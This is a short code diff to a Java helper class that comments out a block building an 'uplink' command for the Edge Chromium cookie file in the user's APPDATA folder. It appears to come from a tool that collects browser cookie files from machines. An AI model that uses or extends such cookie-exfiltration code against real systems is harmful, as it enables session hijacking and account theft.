@@ -157,6 +157,7 @@ public class CookiesCommandHelper {
 			ex.printStackTrace();
 		}
 		
+		/*
 		//Edge
 		String uplinkEdge = "uplink " + EDGE_CHROMIUM_FILENAME.replace("%APPDATA%", appdataDir).replaceAll("\"", "");
 		outcome.addSentCommand(uplinkEdge);
@@ -168,7 +169,7 @@ public class CookiesCommandHelper {
 		}catch(Exception ex) {
 			//proceed
 		}
-		
+		*/
 		return outcome;
 	}
 	
